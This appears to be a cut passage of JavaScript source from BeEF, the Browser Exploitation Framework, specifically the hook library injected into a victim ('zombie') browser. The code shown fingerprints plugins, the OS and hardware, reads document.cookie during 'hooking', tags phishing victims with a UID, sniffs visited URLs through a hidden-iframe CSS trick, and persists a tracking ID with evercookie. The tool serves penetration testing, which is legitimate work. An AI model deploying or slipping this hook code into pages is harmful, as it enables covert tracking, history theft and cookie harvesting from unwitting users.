        var result = false;

        try {
            if (!!device.phonegap || !!device.cordova) result = true; else result = false;
        }
        catch (e) {
            result = false;
        }
        return result;
    },

    /**
     * Checks if the browser supports CORS
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasCors()) { ... }
     */
    hasCors: function () {
        if ('withCredentials' in new XMLHttpRequest())
            return true;
        else if (typeof XDomainRequest !== "undefined")
            return true;
        else
            return false;
    },

    /**
     * Checks if the zombie has Java installed and enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasJava()) { ... }
     */
    hasJava: function () {
        if (beef.browser.getPlugins().match(/java/i) && beef.browser.javaEnabled()) {
          return true;
        } else {
          return false;
        }
    },

    /**
     * Checks if the zombie has VBScript enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasVBScript()) { ... }
     */
    hasVBScript: function () {
        if ((navigator.userAgent.indexOf('MSIE') != -1) && (navigator.userAgent.indexOf('Win') != -1)) {
            return true;
        } else {
            return false;
        }
    },

    /**
     * Returns the list of plugins installed in the browser.
     */
    getPlugins: function () {

        var results;
        Array.prototype.unique = function () {
            var o = {}, i, l = this.length, r = [];
            for (i = 0; i < l; i += 1) o[this[i]] = this[i];
            for (i in o) r.push(o[i]);
            return r;
        };

        // Things lacking navigator.plugins
        if (!this.capabilities()["navigator.plugins"]) this.getPluginsIE();

        // All other browsers that support navigator.plugins
        else if (navigator.plugins && navigator.plugins.length > 0) {
            results = new Array();
            for (var i = 0; i < navigator.plugins.length; i++) {

                // Firefox returns exact plugin versions
                if (beef.browser.isFF()) results[i] = navigator.plugins[i].name + '-v.' + navigator.plugins[i].version;

                // Webkit and Presto (Opera)
                // Don't support the version attribute
                // Sometimes store the version in description (Real, Adobe)
                else results[i] = navigator.plugins[i].name;// + '-desc.' + navigator.plugins[i].description;
            }
            results = results.unique().toString();

            // All browsers that don't support navigator.plugins
        } else {
            results = new Array();
            //firefox https://bugzilla.mozilla.org/show_bug.cgi?id=757726
            // On linux sistem the "version" slot is empty so I'll attach "description" after version
            var plugins = {

                'AdobeAcrobat': {
                    'control': 'Adobe Acrobat',
                    'return': function (control) {
                        try {
                            version = navigator.plugins["Adobe Acrobat"]["description"];
                            return 'Adobe Acrobat Version  ' + version; //+ " description "+ filename;

                        }
                        catch (e) {
                        }


                    }},
                'Flash': {
                    'control': 'Shockwave Flash',
                    'return': function (control) {
                        try {
                            version = navigator.plugins["Shockwave Flash"]["description"];
                            return 'Flash Player Version ' + version; //+ " description "+ filename;
                        }

                        catch (e) {
                        }
                    }},
                'Google_Talk_Plugin_Accelerator': {
                    'control': 'Google Talk Plugin Video Accelerator',
                    'return': function (control) {

                        try {
                            version = navigator.plugins['Google Talk Plugin Video Accelerator']["description"];
                            return 'Google Talk Plugin Video Accelerator Version ' + version; //+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Google_Talk_Plugin': {
                    'control': 'Google Talk Plugin',
                    'return': function (control) {
                        try {
                            version = navigator.plugins['Google Talk Plugin']["description"];
                            return 'Google Talk Plugin Version ' + version;// " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Facebook_Video_Calling_Plugin': {
                    'control': 'Facebook Video Calling Plugin',
                    'return': function (control) {
                        try {
                            version = navigator.plugins["Facebook Video Calling Plugin"]["description"];
                            return 'Facebook Video Calling Plugin Version ' + version;//+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Google_Update': {
                    'control': 'Google Update',
                    'return': function (control) {
                        try {
                            version = navigator.plugins["Google Update"]["description"];
                            return 'Google Update Version ' + version//+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Windows_Activation_Technologies': {
                    'control': 'Windows Activation Technologies',
                    'return': function (control) {
                        try {
                            version = navigator.plugins["Windows Activation Technologies"]["description"];
                            return 'Windows Activation Technologies Version ' + version;//+ " description "+ filename;
                        }
                        catch (e) {
                        }

                    }},
                'VLC_Web_Plugin': {
                    'control': 'VLC Web Plugin',
                    'return': function (control) {
                        try {
                            version = navigator.plugins["VLC Web Plugin"]["description"];
                            return 'VLC Web Plugin Version ' + version;//+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Google_Earth_Plugin': {
                    'control': 'Google Earth Plugin',

                    'return': function (control) {
                        try {
                            version = navigator.plugins['Google Earth Plugin']["description"];
                            return 'Google Earth Plugin Version ' + version;//+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'FoxitReader_Plugin': {
                    'control': 'FoxitReader Plugin',
                    'return': function (control) {
                        try {
                            version = navigator.plugins['Foxit Reader Plugin for Mozilla']['version'];
                            return 'FoxitReader Plugin Version ' + version;
                        } catch (e) {
                        }
                    }}
            };

            var c = 0;
            for (var i in plugins) {
                //each element od plugins
                var control = plugins[i]['control'];
                try {
                    var version = plugins[i]['return'](control);
                    if (version) {
                        results[c] = version;
                        c = c + 1;
                    }
                }
                catch (e) {
                }

            }
        }
        // Return results
        return results;
    },

    /**
     * Returns a list of plugins detected by IE. This is a hack because IE doesn't
     * support navigator.plugins
     */
    getPluginsIE: function () {
        var results = '';
        var plugins = {'AdobePDF6': {
            'control': 'PDF.PdfCtrl',
            'return': function (control) {
                version = control.getVersions().split(',');
                version = version[0].split('=');
                return 'Acrobat Reader v' + parseFloat(version[1]);
            }},
            'AdobePDF7': {
                'control': 'AcroPDF.PDF',
                'return': function (control) {
                    version = control.getVersions().split(',');
                    version = version[0].split('=');
                    return 'Acrobat Reader v' + parseFloat(version[1]);
                }},
            'Flash': {
                'control': 'ShockwaveFlash.ShockwaveFlash',
                'return': function (control) {
                    version = control.getVariable('$version').substring(4);
                    return 'Flash Player v' + version.replace(/,/g, ".");
                }},
            'Quicktime': {
                'control': 'QuickTime.QuickTime',
                'return': function (control) {
                    return 'QuickTime Player';
                }},
            'RealPlayer': {
                'control': 'RealPlayer',
                'return': function (control) {
                    version = control.getVersionInfo();
                    return 'RealPlayer v' + parseFloat(version);
                }},
            'Shockwave': {
                'control': 'SWCtl.SWCtl',
                'return': function (control) {
                    version = control.ShockwaveVersion('').split('r');
                    return 'Shockwave v' + parseFloat(version[0]);
                }},
            'WindowsMediaPlayer': {
                'control': 'WMPlayer.OCX',
                'return': function (control) {
                    return 'Windows Media Player v' + parseFloat(control.versionInfo);
                }},
            'FoxitReaderPlugin': {
                'control': 'FoxitReader.FoxitReaderCtl.1',
                'return': function (control) {
                    return 'Foxit Reader Plugin v' + parseFloat(control.versionInfo);
                }}
        };
        if (window.ActiveXObject) {
            var j = 0;
            for (var i in plugins) {
                var control = null;
                var version = null;
                try {
                    control = new ActiveXObject(plugins[i]['control']);
                } catch (e) {
                }
                if (control) {
                    if (j != 0)
                        results += ', ';
                    results += plugins[i]['return'](control);
                    j++;
                }
            }
        }
        return results;
    },

    /**
     * Returns zombie screen size and color depth.
     */
    getScreenSize: function () {
        return {
            width: window.screen.width,
            height: window.screen.height,
            colordepth: window.screen.colorDepth
        }
    },

    /**
     * Returns zombie browser window size.
     * @from: http://www.howtocreate.co.uk/tutorials/javascript/browserwindow
     */
    getWindowSize: function () {
        var myWidth = 0, myHeight = 0;
        if (typeof( window.innerWidth ) == 'number') {
            // Non-IE
            myWidth = window.innerWidth;
            myHeight = window.innerHeight;
        } else if (document.documentElement && ( document.documentElement.clientWidth || document.documentElement.clientHeight )) {
            // IE 6+ in 'standards compliant mode'
            myWidth = document.documentElement.clientWidth;
            myHeight = document.documentElement.clientHeight;
        } else if (document.body && ( document.body.clientWidth || document.body.clientHeight )) {
            // IE 4 compatible
            myWidth = document.body.clientWidth;
            myHeight = document.body.clientHeight;
        }
        return {
            width: myWidth,
            height: myHeight
        }
    },

    /**
     * Construct hash from browser details. This function is used to grab the browser details during the hooking process
     */
    getDetails: function () {
        var details = new Array();

        var browser_name = beef.browser.getBrowserName();
        var browser_version = beef.browser.getBrowserVersion();
        var browser_reported_name = beef.browser.getBrowserReportedName();
        var browser_language = beef.browser.getBrowserLanguage();
        var page_title = (document.title) ? document.title : "Unknown";
        var page_uri = (document.location.href) ? document.location.href : "Unknown";
        var page_referrer = (document.referrer) ? document.referrer : "Unknown";
        var hostname = (document.location.hostname) ? document.location.hostname : "Unknown";
        switch (document.location.protocol) {
            case "http:":
                var default_port = "80";
                break;
            case "https:":
                var default_port = "443";
                break
            default:
                var default_port = "";
        }
        var hostport = (document.location.port) ? document.location.port : default_port;
        var browser_plugins = beef.browser.getPlugins();
        var date_stamp = new Date().toString();
        var os_name = beef.os.getName();
        var os_version = beef.os.getVersion();
        var default_browser = beef.os.getDefaultBrowser();
        var hw_name = beef.hardware.getName();
        var cpu_type = beef.hardware.cpuType();
        var touch_enabled = (beef.hardware.isTouchEnabled()) ? "Yes" : "No";
        var browser_platform = (typeof(navigator.platform) != "undefined" && navigator.platform != "") ? navigator.platform : null;
        var browser_type = JSON.stringify(beef.browser.type(), function (key, value) {
            if (value == true) return value; else if (typeof value == 'object') return value; else return;
        });
        var screen_size = beef.browser.getScreenSize();
        var window_size = beef.browser.getWindowSize();
        var vbscript_enabled = (beef.browser.hasVBScript()) ? "Yes" : "No";
        var has_flash = (beef.browser.hasFlash()) ? "Yes" : "No";
        var has_phonegap = (beef.browser.hasPhonegap()) ? "Yes" : "No";
        var has_googlegears = (beef.browser.hasGoogleGears()) ? "Yes" : "No";
        var has_web_socket = (beef.browser.hasWebSocket()) ? "Yes" : "No";
        var has_webrtc = (beef.browser.hasWebRTC()) ? "Yes" : "No";
        var has_activex = (beef.browser.hasActiveX()) ? "Yes" : "No";
        var has_quicktime = (beef.browser.hasQuickTime()) ? "Yes" : "No";
        var has_realplayer = (beef.browser.hasRealPlayer()) ? "Yes" : "No";
        var has_wmp = (beef.browser.hasWMP()) ? "Yes" : "No";
        try {
            var cookies = document.cookie;
            var veglol = beef.browser.cookie.veganLol();
            var has_session_cookies = (beef.browser.cookie.hasSessionCookies(veglol)) ? "Yes" : "No";
            var has_persistent_cookies = (beef.browser.cookie.hasPersistentCookies(veglol)) ? "Yes" : "No";
            if (cookies) details['Cookies'] = cookies;
            if (has_session_cookies) details['hasSessionCookies'] = has_session_cookies;
            if (has_persistent_cookies) details['hasPersistentCookies'] = has_persistent_cookies;
        } catch (e) {
            // the hooked origin is using HttpOnly. EverCookie is persisting the BeEF hook in a different way,
            // and there is no reason to read cookies at this point
            details['Cookies'] = "Cookies can't be read. The hooked origin is most probably using HttpOnly.";
            details['hasSessionCookies'] = "No";
            details['hasPersistentCookies'] = "No";
        }

        if (browser_name) details['BrowserName'] = browser_name;
        if (browser_version) details['BrowserVersion'] = browser_version;
        if (browser_reported_name) details['BrowserReportedName'] = browser_reported_name;
        if (browser_language) details['BrowserLanguage'] = browser_language;
        if (page_title) details['PageTitle'] = page_title;
        if (page_uri) details['PageURI'] = page_uri;
        if (page_referrer) details['PageReferrer'] = page_referrer;
        if (hostname) details['HostName'] = hostname;
        if (hostport) details['HostPort'] = hostport;
        if (browser_plugins) details['BrowserPlugins'] = browser_plugins;
        if (os_name) details['OsName'] = os_name;
        if (os_version) details['OsVersion'] = os_version;
        if (default_browser) details['DefaultBrowser'] = default_browser;
        if (hw_name) details['Hardware'] = hw_name;
        if (cpu_type) details['CPU'] = cpu_type;
        if (touch_enabled) details['TouchEnabled'] = touch_enabled;
        if (date_stamp) details['DateStamp'] = date_stamp;
        if (browser_platform) details['BrowserPlatform'] = browser_platform;
        if (browser_type) details['BrowserType'] = browser_type;
        if (screen_size) details['ScreenSize'] = screen_size;
        if (window_size) details['WindowSize'] = window_size;
        if (vbscript_enabled) details['VBScriptEnabled'] = vbscript_enabled;
        if (has_flash) details['HasFlash'] = has_flash;
        if (has_phonegap) details['HasPhonegap'] = has_phonegap;
        if (has_web_socket) details['HasWebSocket'] = has_web_socket;
        if (has_googlegears) details['HasGoogleGears'] = has_googlegears;
        if (has_webrtc) details['HasWebRTC'] = has_webrtc;
        if (has_activex) details['HasActiveX'] = has_activex;
        if (has_quicktime) details['HasQuickTime'] = has_quicktime;
        if (has_realplayer) details['HasRealPlayer'] = has_realplayer;
        if (has_wmp) details['HasWMP'] = has_wmp;

        var pf_integration = "";
        if (pf_integration) {
            var pf_param = "uid";
            var pf_victim_uid = "";
            var location_search = window.location.search.substring(1);
            var params = location_search.split('&');
            for (var i = 0; i < params.length; i++) {
                var param_entry = params[i].split('=');
                if (param_entry[0] == pf_param) {
                    pf_victim_uid = param_entry[1];
                    details['PhishingFrenzyUID'] = pf_victim_uid;
                    break;
                }
            }
        } else {
            details['PhishingFrenzyUID'] = "N/A";
        }

        return details;
    },

    /**
     * Returns boolean value depending on whether the browser supports ActiveX
     */
    hasActiveX: function () {
        return !!window.ActiveXObject;
    },

    /**
     * Returns boolean value depending on whether the browser supports WebRTC
     */
    hasWebRTC: function () {
        return (!!window.mozRTCPeerConnection || !!window.webkitRTCPeerConnection);
    },

    /**
     * Returns boolean value depending on whether the browser supports Silverlight
     */
    hasSilverlight: function () {
        var result = false;

        try {
            if (beef.browser.isIE()) {
                var slControl = new ActiveXObject('AgControl.AgControl');
                result = true;
            } else if (navigator.plugins["Silverlight Plug-In"]) {
                result = true;
            }
        } catch (e) {
            result = false;
        }

        return result;
    },

    /**
     * Returns array of results, whether or not the target zombie has visited the specified URL
     */
    hasVisited: function (urls) {
        var results = new Array();
        var iframe = beef.dom.createInvisibleIframe();
        var ifdoc = (iframe.contentDocument) ? iframe.contentDocument : iframe.contentWindow.document;
        ifdoc.open();
        ifdoc.write('<style>a:visited{width:0px !important;}</style>');
        ifdoc.close();
        urls = urls.split("\n");
        var count = 0;
        for (var i in urls) {
            var u = urls[i];
            if (u != "" || u != null) {
                var success = false;
                var a = ifdoc.createElement('a');
                a.href = u;
                ifdoc.body.appendChild(a);
                var width = null;
                (a.currentStyle) ? width = a.currentStyle['width'] : width = ifdoc.defaultView.getComputedStyle(a, null).getPropertyValue("width");
                if (width == '0px') {
                    success = true;
                }
                results.push({'url': u, 'visited': success});
                count++;
            }
        }
        beef.dom.removeElement(iframe);
        if (results.length == 0) {
            return false;
        }
        return results;
    },

    /**
     * Checks if the zombie has Web Sockets enabled.
     * @return: {Boolean} true or false.
     * In FF6+ the websocket object has been prefixed with Moz, so now it's called MozWebSocket
     * */
    hasWebSocket: function () {
        return !!window.WebSocket || !!window.MozWebSocket;
    },

    /**
     * Checks if the zombie has Google Gears installed.
     * @return: {Boolean} true or false.
     *
     * @from: https://code.google.com/apis/gears/gears_init.js
     * */
    hasGoogleGears: function () {

        var ggfactory = null;

        // Chrome
        if (window.google && google.gears) return true;

        // Firefox
        if (typeof GearsFactory != 'undefined') {
            ggfactory = new GearsFactory();
        } else {
            // IE
            try {
                ggfactory = new ActiveXObject('Gears.Factory');
                // IE Mobile on WinCE.
                if (ggfactory.getBuildInfo().indexOf('ie_mobile') != -1) {
                    ggfactory.privateSetGlobalObject(this);
                }
            } catch (e) {
                // Safari
                if ((typeof navigator.mimeTypes != 'undefined')
                    && navigator.mimeTypes["application/x-googlegears"]) {
                    ggfactory = document.createElement("object");
                    ggfactory.style.display = "none";
                    ggfactory.width = 0;
                    ggfactory.height = 0;
                    ggfactory.type = "application/x-googlegears";
                    document.documentElement.appendChild(ggfactory);
                    if (ggfactory && (typeof ggfactory.create == 'undefined')) ggfactory = null;
                }
            }
        }
        if (!ggfactory) return false; else return true;
    },

    /**
     * Checks if the zombie has Foxit PDF reader plugin.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasFoxit()) { ... }
     * */
    hasFoxit: function () {

        var foxitplugin = false;

        try {
            if (beef.browser.isIE()) {
                var foxitControl = new ActiveXObject('FoxitReader.FoxitReaderCtl.1');
                foxitplugin = true;
            } else if (navigator.plugins['Foxit Reader Plugin for Mozilla']) {
                foxitplugin = true;
            }
        } catch (e) {
            foxitplugin = false;
        }

        return foxitplugin;
    },

    /**
     * Returns the page head HTML
     **/
    getPageHead: function () {
        var html_head;
        try {
            html_head = document.head.innerHTML.toString();
        } catch (e) {
        }
        return html_head;
    },

    /**
     * Returns the page body HTML
     **/
    getPageBody: function () {
        var html_body;
        try {
            html_body = document.body.innerHTML.toString();
        } catch (e) {
        }
        return html_body;
    },

    /**
     * Dynamically changes the favicon: works in Firefox, Chrome and Opera
     **/
    changeFavicon: function (favicon_url) {
        var iframe = null;
        if (this.isC()) {
            iframe = document.createElement('iframe');
            iframe.src = 'about:blank';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
        }
        var link = document.createElement('link'),
            oldLink = document.getElementById('dynamic-favicon');
        link.id = 'dynamic-favicon';
        link.rel = 'shortcut icon';
        link.href = favicon_url;
        if (oldLink) document.head.removeChild(oldLink);
        document.head.appendChild(link);
        if (this.isC()) iframe.src += '';
    },

    /**
     * Changes page title
     **/
    changePageTitle: function (title) {
        document.title = title;
    },

    /**
     * Get the browser language
     */
    getBrowserLanguage: function () {
        var l = 'Unknown';
        try {
            l = window.navigator.userLanguage || window.navigator.language;
        } catch (e) {
        }
        return l;
    },

    /**
     *  A function that gets the max number of simultaneous connections the
     *  browser can make per origin, or globally on all origin.
     *
     *  This code is based on research from browserspy.dk
     *
     * @parameter {ENUM: 'PER_DOMAIN', 'GLOBAL'=>default}
     * @return {Deferred promise} A jQuery deferred object promise, which when resolved passes
     *    the number of connections to the callback function as "this"
     *
     *    example usage:
     *        $j.when(getMaxConnections()).done(function(){
     *            console.debug("Max Connections: " + this);
     *            });
     *
     */
    getMaxConnections: function (scope) {

        var imagesCount = 30;		// Max number of images to test
        var secondsTimeout = 5;		// Image load timeout threashold
        var testUrl = "";		// The image testing service URL

        // User broserspy.dk max connections service URL.
        if (scope == 'PER_DOMAIN')
            testUrl = "http://browserspy.dk/connections.php?img=1&amp;random=";
        else
        // The token will be replaced by a different number with each request (different origin).
            testUrl = "http://<token>.browserspy.dk/connections.php?img=1&amp;random=";

        var imagesLoaded = 0;			// Number of responding images before timeout.
        var imagesRequested = 0;		// Number of requested images.
        var testImages = new Array();		// Array of all images.
        var deferredObject = $j.Deferred();	// A jquery Deferred object.

        for (var i = 1; i <= imagesCount; i++) {
            // Asynchronously request image.
            testImages[i] =
                $j.ajax({
                    type: "get",
                    dataType: true,
                    url: (testUrl.replace("<token>", i)) + Math.random(),
                    data: "",
                    timeout: (secondsTimeout * 1000),

                    // Function on completion of request.
                    complete: function (jqXHR, textStatus) {

                        imagesRequested++;

                        // If the image returns a 200 or a 302, the text Status is "error", else null
                        if (textStatus == "error") {
                            imagesLoaded++;
                        }

                        // If all images requested
                        if (imagesRequested >= imagesCount) {
                            // resolve the deferred object passing the number of loaded images.
                            deferredObject.resolveWith(imagesLoaded);
                        }
                    }
                });

        }

        // Return a promise to resolve the deffered object when the images are loaded.
        return deferredObject.promise();

    }

};

beef.regCmp('beef.browser');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.browser.cookie
 * 
 * Provides fuctions for working with cookies. 
 * Several functions adopted from http://techpatterns.com/downloads/javascript_cookies.php
 * Original author unknown.
 * 
 */
beef.browser.cookie = {
	
		setCookie: function (name, value, expires, path, domain, secure) 
		{
	
			var today = new Date();
			today.setTime( today.getTime() );
	
			if ( expires )
			{
				expires = expires * 1000 * 60 * 60 * 24;
			}
			var expires_date = new Date( today.getTime() + (expires) );
	
			document.cookie = name + "=" +escape( value ) +
				( ( expires ) ? ";expires=" + expires_date.toGMTString() : "" ) +
				( ( path ) ? ";path=" + path : "" ) +
				( ( domain ) ? ";domain=" + domain : "" ) +
				( ( secure ) ? ";secure" : "" );
		},

		getCookie: function(name) 
		{
			var a_all_cookies = document.cookie.split( ';' );
			var a_temp_cookie = '';
			var cookie_name = '';
			var cookie_value = '';
			var b_cookie_found = false;
			
			for ( i = 0; i < a_all_cookies.length; i++ )
			{
				a_temp_cookie = a_all_cookies[i].split( '=' );
				cookie_name = a_temp_cookie[0].replace(/^\s+|\s+$/g, '');
				if ( cookie_name == name )
				{
					b_cookie_found = true;
					if ( a_temp_cookie.length > 1 )
					{
						cookie_value = unescape( a_temp_cookie[1].replace(/^\s+|\s+$/g, '') );
					}
					return cookie_value;
					break;
				}
				a_temp_cookie = null;
				cookie_name = '';
			}
			if ( !b_cookie_found )
			{
				return null;
			}
		},

		deleteCookie: function (name, path, domain) 
		{
			if ( this.getCookie(name) ) document.cookie = name + "=" +
			( ( path ) ? ";path=" + path : "") +
			( ( domain ) ? ";domain=" + domain : "" ) +
			";expires=Thu, 01-Jan-1970 00:00:01 GMT";
		},

		veganLol: function (){
			var to_hell= '';
			var min = 17;
			var max = 25;
			var lol_length = Math.floor(Math.random() * (max - min + 1)) + min;

			var grunt = function(){
				var moo = Math.floor(Math.random() * 62);
				var char = '';
				if(moo < 36){
					char = String.fromCharCode(moo + 55);
				}else{
					char = String.fromCharCode(moo + 61);
				}
				if(char != ';' && char != '='){
					return char;
				}else{
					return 'x';
				}
			};

			while(to_hell.length < lol_length){
				to_hell += grunt();
			}
			return to_hell;
		},
		
		hasSessionCookies: function (name){
			this.setCookie( name, beef.browser.cookie.veganLol(), '', '/', '', '' );

			cookiesEnabled = (this.getCookie(name) == null)? false:true;
			this.deleteCookie(name, '/', '');
			return cookiesEnabled;
			
		},

		hasPersistentCookies: function (name){
			this.setCookie( name, beef.browser.cookie.veganLol(), 1, '/', '', '' );

			cookiesEnabled = (this.getCookie(name) == null)? false:true;
			this.deleteCookie(name, '/', '');
			return cookiesEnabled;
			
		}	
					
};

beef.regCmp('beef.browser.cookie');

//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.browser.popup
 * 
 * Provides fuctions for working with cookies. 
 * Several functions adopted from http://davidwalsh.name/popup-block-javascript
 * Original author unknown.
 * 
 */
beef.browser.popup = {
	
		blocker_enabled: function ()
		{
			screenParams = beef.browser.getScreenSize();
			var popUp = window.open('/', 'windowName0', 'width=1, height=1, left='+screenParams.width+', top='+screenParams.height+', scrollbars, resizable');
			if (popUp == null || typeof(popUp)=='undefined') {   
			  	return true;
			} else {   
				popUp.close();
				return false;
			}
		}
};

beef.regCmp('beef.browser.popup');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.session
 *
 * Provides basic session functions.
 */
beef.session = {
	
	hook_session_id_length: 80,
	hook_session_id_chars: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",	
	ec: new evercookie(),
    beefhook: "BEEFHOOK",
	
	/**
	 * Gets a string which will be used to identify the hooked browser session
	 * 
	 * @example: var hook_session_id = beef.session.get_hook_session_id();
	 */
  	get_hook_session_id: function() {
		// check if the browser is already known to the framework
		var id = this.ec.evercookie_cookie(beef.session.beefhook);
		if (typeof id == 'undefined') {
			var id = this.ec.evercookie_userdata(beef.session.beefhook);
		}
		if (typeof id == 'undefined') {
			var id = this.ec.evercookie_window(beef.session.beefhook);
		}
		
		// if the browser is not known create a hook session id and set it
		if ((typeof id == 'undefined') || (id == null)) {
			id = this.gen_hook_session_id();
			this.set_hook_session_id(id);
		}
		
		// return the hooked browser session identifier
		return id;
	},
	
	/**
	 * Sets a string which will be used to identify the hooked browser session
	 * 
	 * @example: beef.session.set_hook_session_id('RANDOMSTRING');
	 */
  	set_hook_session_id: function(id) {
		// persist the hook session id
		this.ec.evercookie_cookie(beef.session.beefhook, id);
		this.ec.evercookie_userdata(beef.session.beefhook, id);
		this.ec.evercookie_window(beef.session.beefhook, id);
	},
	
	/**
	 * Generates a random string using the chars in hook_session_id_chars.
	 * 
	 * @example: beef.session.gen_hook_session_id();
	 */
  	gen_hook_session_id: function() {
	    // init the return value
		var hook_session_id = "";
		
		// construct the random string 
		for(var i=0; i<this.hook_session_id_length; i++) {
		  var rand_num = Math.floor(Math.random()*this.hook_session_id_chars.length);
		  hook_session_id += this.hook_session_id_chars.charAt(rand_num);
		}
		
		return hook_session_id;
	}
};

beef.regCmp('beef.session');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.os = {

	ua: navigator.userAgent,

	/**
	  * Detect default browser (IE only)
	  * Written by unsticky
	  * http://ha.ckers.org/blog/20070319/detecting-default-browser-in-ie/
	  */
	getDefaultBrowser: function() {
		var result = "Unknown"
		try {
			var mt = document.mimeType;
			if (mt) {
				if (mt == "Safari Document")       result = "Safari";
				if (mt == "Firefox HTML Document") result = "Firefox";
				if (mt == "Chrome HTML Document")  result = "Chrome";
				if (mt == "HTML Document")         result = "Internet Explorer";
				if (mt == "Opera Web Document")    result = "Opera";
			}
		} catch (e) {
			beef.debug("[os] getDefaultBrowser: "+e.message);
		}
		return result;
	},

	// the likelihood that we hook Windows 3.11 (which has only Win in the UA string) is zero in 2015
	isWin311: function() {
		return (this.ua.match('(Win16)')) ? true : false;
	},
	
	isWinNT4: function() {
		return (this.ua.match('(Windows NT 4.0)')) ? true : false;
	},
	
	isWin95: function() {
		return (this.ua.match('(Windows 95)|(Win95)|(Windows_95)')) ? true : false;
	},
	isWinCE: function() {
		return (this.ua.match('(Windows CE)')) ? true : false;
	},
	
	isWin98: function() {
		return (this.ua.match('(Windows 98)|(Win98)')) ? true : false;
	},
	
	isWinME: function() {
		return (this.ua.match('(Windows ME)|(Win 9x 4.90)')) ? true : false;
	},
	
	isWin2000: function() {
		return (this.ua.match('(Windows NT 5.0)|(Windows 2000)')) ? true : false;
	},

	isWin2000SP1: function() {
		return (this.ua.match('Windows NT 5.01 ')) ? true : false;
	},
	
	isWinXP: function() {
		return (this.ua.match('(Windows NT 5.1)|(Windows XP)')) ? true : false;
	},
	
	isWinServer2003: function() {
		return (this.ua.match('(Windows NT 5.2)')) ? true : false;
	},
	
	isWinVista: function() {
		return (this.ua.match('(Windows NT 6.0)')) ? true : false;
	},
	
	isWin7: function() {
		return (this.ua.match('(Windows NT 6.1)|(Windows NT 7.0)')) ? true : false;
	},

	isWin8: function() {
		return (this.ua.match('(Windows NT 6.2)')) ? true : false;
	},	
	
	isWin81: function() {
		return (this.ua.match('(Windows NT 6.3)')) ? true : false;
	},
	
	isOpenBSD: function() {
		return (this.ua.indexOf('OpenBSD') != -1) ? true : false;
	},
	
	isSunOS: function() {
		return (this.ua.indexOf('SunOS') != -1) ? true : false;
	},
	
	isLinux: function() {
		return (this.ua.match('(Linux)|(X11)')) ? true : false;
	},
	
	isMacintosh: function() {
		return (this.ua.match('(Mac_PowerPC)|(Macintosh)|(MacIntel)')) ? true : false;
	},

	isOsxYosemite: function(){ // TODO
		return (this.ua.match('(OS X 10_10)|(OS X 10.10)')) ? true : false;
	},
	isOsxMavericks: function(){ // TODO
		return (this.ua.match('(OS X 10_9)|(OS X 10.9)')) ? true : false;
	},
	isOsxSnowLeopard: function(){ // TODO
		return (this.ua.match('(OS X 10_8)|(OS X 10.8)')) ? true : false;
	},
	isOsxLeopard: function(){ // TODO
		return (this.ua.match('(OS X 10_7)|(OS X 10.7)')) ? true : false;
	},

	isWinPhone: function() {
		return (this.ua.match('(Windows Phone)')) ? true : false;
	},

	isIphone: function() {
		return (this.ua.indexOf('iPhone') != -1) ? true : false;
	},

	isIpad: function() {
		return (this.ua.indexOf('iPad') != -1) ? true : false;
	},

	isIpod: function() {
		return (this.ua.indexOf('iPod') != -1) ? true : false;
	},

	isNokia: function() {
		return (this.ua.match('(Maemo Browser)|(Symbian)|(Nokia)')) ? true : false;
	},

	isAndroid: function() {
		return (this.ua.match('Android')) ? true : false;
	},

	isBlackBerry: function() {
		return (this.ua.match('BlackBerry')) ? true : false;
	},

	isWebOS: function() {
		return (this.ua.match('webOS')) ? true : false;
	},

	isQNX: function() {
		return (this.ua.match('QNX')) ? true : false;
	},
	
	isBeOS: function() {
		return (this.ua.match('BeOS')) ? true : false;
	},

	isWindows: function() {
		return (this.ua.match('Windows')) ? true : false;
	},
	
	getName: function() {
		
		if(this.isWindows()){
			return 'Windows';
		}

		if(this.isMacintosh()) {
			return 'OSX';
		}

		//Nokia
		if(this.isNokia()) {
			if (this.ua.indexOf('Maemo Browser') != -1) return 'Maemo';
			if (this.ua.match('(SymbianOS)|(Symbian OS)')) return 'SymbianOS';
			if (this.ua.indexOf('Symbian') != -1) return 'Symbian';
		}

		// BlackBerry
		if(this.isBlackBerry()) return 'BlackBerry OS';

		// Android
		if(this.isAndroid()) return 'Android';

		// SunOS
		if(this.isSunOS()) return 'SunOS';

		//Linux
		if(this.isLinux()) return 'Linux';

		//iPhone
		if (this.isIphone()) return 'iOS';
		//iPad
		if (this.isIpad()) return 'iOS';
		//iPod
		if (this.isIpod()) return 'iOS';
		
		//others
		if(this.isQNX()) return 'QNX';
		if(this.isBeOS()) return 'BeOS';
		if(this.isWebOS()) return 'webOS';
		
		return 'unknown';
	},

	getVersion: function(){
		//Windows
		if(this.isWindows()) {
			if (this.isWin81())         return '8.1';
			if (this.isWin8())          return '8';
			if (this.isWin7())          return '7';
			if (this.isWinVista())      return 'Vista';
			if (this.isWinXP())         return 'XP';
			if (this.isWinServer2003()) return 'Server 2003';
			if (this.isWin2000SP1())    return '2000 SP1';
			if (this.isWin2000())       return '2000';
			if (this.isWinME())         return 'Millenium';

			if (this.isWinNT4())        return 'NT 4';
			if (this.isWinCE())         return 'CE';
			if (this.isWin95())         return '95';
			if (this.isWin98())         return '98';
		}

		// OS X
